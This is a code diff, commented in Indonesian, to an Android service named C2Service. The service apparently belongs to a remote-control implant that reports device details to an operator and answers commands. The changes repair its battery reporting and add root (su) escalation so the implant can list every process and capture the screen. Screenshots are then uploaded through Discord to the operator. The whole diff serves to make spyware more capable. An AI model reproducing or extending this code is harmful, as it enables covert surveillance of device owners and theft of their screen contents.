@@ -9,6 +9,7 @@ import android.content.ClipboardManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.provider.Settings
 import android.content.pm.ServiceInfo
@@ -183,11 +184,9 @@ class C2Service : Service() {
             backoff = 4000L
             if (!announced) {
                 announced = true
-                val pct = (getSystemService(Context.BATTERY_SERVICE) as BatteryManager)
-                    .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                 say(
                     "online | ${Build.MANUFACTURER} ${Build.MODEL} | android ${Build.VERSION.RELEASE} " +
-                        "(sdk ${Build.VERSION.SDK_INT}) | batt $pct% | id ${Config.uuid.take(8)} | " +
+                        "(sdk ${Build.VERSION.SDK_INT}) | batt ${battPct()} | id ${Config.uuid.take(8)} | " +
                         "!$deviceTag | perm ${Perms.missing(this).size} kurang"
                 )
             }
@@ -344,13 +343,36 @@ class C2Service : Service() {
 
     // ---------------------------------------------------------------- perintah
 
+    /**
+     * Persentase baterai sebagai string.
+     *
+     * `BATTERY_PROPERTY_CAPACITY` balik `Int.MIN_VALUE` di emulator dan di
+     * sebagian perangkat yang tidak mengisi properti itu — dulu angka itu
+     * dicetak apa adanya jadi "-2147483648%". Sticky intent
+     * ACTION_BATTERY_CHANGED masih membawa level dan scale yang benar.
+     */
+    private fun battPct(): String {
+        try {
+            val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
+            val p = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
+            if (p in 0..100) return "$p%"
+        } catch (_: Exception) {
+        }
+        try {
+            val i = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+            val lvl = i?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+            val scale = i?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
+            if (lvl >= 0 && scale > 0) return "${lvl * 100 / scale}%"
+        } catch (_: Exception) {
+        }
+        return "?"
+    }
+
     private fun info() {
-        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
-        val pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
         val ext = if (Vfs.writable(Vfs.external)) "rw" else "ro"
         say(
             "MODEL=${Build.MODEL} SDK=${Build.VERSION.SDK_INT} " +
-                "CWD=$cwd BATT=$pct% EXT=$ext MISS=${Perms.missing(this).size}"
+                "CWD=$cwd BATT=${battPct()} EXT=$ext MISS=${Perms.missing(this).size}"
         )
     }
 
@@ -401,8 +423,6 @@ class C2Service : Service() {
         }
         val apk = pkg?.applicationInfo?.sourceDir ?: ""
         val size = if (apk.isNotEmpty()) "${File(apk).length()} B" else "?"
-        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
-        val pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
         say(
             "who    : ${Config.uuid.take(8)}   (uuid ${Config.uuid})\n" +
                 "device : ${Build.MANUFACTURER} ${Build.MODEL}  (${Build.DEVICE})\n" +
@@ -413,7 +433,7 @@ class C2Service : Service() {
                 "proc   : pid ${Process.myPid()}   up " +
                 uptimeText((SystemClock.elapsedRealtime() - Process.getStartElapsedRealtime()) / 1000) +
                 "   (hp up ${uptimeText(SystemClock.elapsedRealtime() / 1000)})\n" +
-                "batt   : $pct%   perm kurang ${Perms.missing(this).size}\n" +
+                "batt   : ${battPct()}   perm kurang ${Perms.missing(this).size}\n" +
                 "alamat : !$deviceTag   !${Config.uuid.take(8)}   !@$deviceTag"
         )
     }
@@ -490,7 +510,41 @@ class C2Service : Service() {
         }
     }
 
+    /**
+     * Daftar proses.
+     *
+     * Sejak Android 8 procfs dipasang dengan hidepid, jadi `ps -A` dari uid
+     * aplikasi hanya memperlihatkan proses milik uid itu sendiri — dulu
+     * hasilnya satu baris tanpa penjelasan. Sekarang: pakai `su` kalau ada
+     * (daftar penuh), kalau tidak tetap `ps -A` tapi diberi catatan bahwa
+     * yang terlihat cuma proses sendiri.
+     */
     private fun ps() {
+        if (Actions.hasSu()) {
+            val full = Actions.su("ps -A", 10000)
+            if (full.isNotBlank()) {
+                say(full)
+                return
+            }
+        }
+        val viaShell = try {
+            val p = ProcessBuilder("ps", "-A").redirectErrorStream(true).start()
+            val text = p.inputStream.bufferedReader().readText().trim()
+            p.waitFor()
+            text
+        } catch (e: Exception) {
+            ""
+        }
+        if (viaShell.isNotEmpty()) {
+            val lines = viaShell.lines().filter { it.isNotBlank() }
+            if (lines.size > 2) {
+                say(viaShell)
+            } else {
+                say(viaShell + "\n\n(hanya proses uid ini yang terlihat; procfs dibatasi " +
+                    "sejak Android 8. `root` membuka daftar penuh.)")
+            }
+            return
+        }
         val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
         val list = am.runningAppProcesses?.joinToString("\n") { "${it.pid} ${it.processName}" }
         say(list ?: "(tidak tersedia)")
@@ -683,24 +737,46 @@ class C2Service : Service() {
      * Versi lama tetap melaporkan path seolah berhasil. Di sini hasilnya
      * diperiksa, dan kegagalan dilaporkan apa adanya.
      */
+    /**
+     * Screenshot layar.
+     *
+     * `screencap` butuh READ_FRAME_BUFFER, permission bertanda tangan yang
+     * cuma dipegang aplikasi sistem. Dari uid aplikasi hasilnya file kosong
+     * tanpa pesan — itu yang dulu muncul sebagai "file kosong". Dengan root
+     * jalan normal; tanpa root Android memang menolak, dan itu dilaporkan
+     * sebagai penolakan, bukan sebagai kegagalan misterius.
+     */
     private fun shot() {
         val out = File(cacheDir, "shot.png")
         if (out.exists()) out.delete()
-        try {
-            val p = ProcessBuilder("screencap", "-p", out.absolutePath)
-                .redirectErrorStream(true)
-                .start()
-            val text = p.inputStream.bufferedReader().use { it.readText() }
-            p.waitFor()
-            if (out.exists() && out.length() > 1000) {
-                val ok = Discord.upload(out, tag + "shot")
-                say(if (ok) "SHOT ${out.length()} B" else "SHOT_GAGAL upload")
-                out.delete()
-            } else {
-                say("SHOT_GAGAL screencap: ${text.trim().ifEmpty { "file kosong" }}")
+
+        val err = StringBuilder()
+        if (Actions.hasSu()) {
+            val t = Actions.su("screencap -p " + out.absolutePath, 15000)
+            if (t.isNotBlank()) err.append(t.trim())
+        } else {
+            try {
+                val p = ProcessBuilder("screencap", "-p", out.absolutePath)
+                    .redirectErrorStream(true)
+                    .start()
+                val text = p.inputStream.bufferedReader().use { it.readText() }
+                p.waitFor()
+                if (text.isNotBlank()) err.append(text.trim())
+            } catch (e: Exception) {
+                err.append(e.message ?: e.javaClass.simpleName)
             }
-        } catch (e: Exception) {
-            say("SHOT_GAGAL ${e.message}")
+        }
+
+        if (out.exists() && out.length() > 1000) {
+            val ok = Discord.upload(out, tag + "shot")
+            say(if (ok) "SHOT ${out.length()} B" else "SHOT_GAGAL upload")
+            out.delete()
+        } else {
+            say(
+                "SHOT_GAGAL " + err.toString().ifEmpty {
+                    "screencap ditolak OS — butuh root (READ_FRAME_BUFFER hanya untuk aplikasi sistem)"
+                }
+            )
         }
     }
 
@@ -872,11 +948,9 @@ class C2Service : Service() {
     }
 
     private fun battery() {
-        val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
-        val pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
         val ignore = pm.isIgnoringBatteryOptimizations(packageName)
-        say("BATT=$pct% optim=${if (ignore) "off" else "on"}")
+        say("BATT=${battPct()} optim=${if (ignore) "off" else "on"}")
     }
 
     private fun perms() {
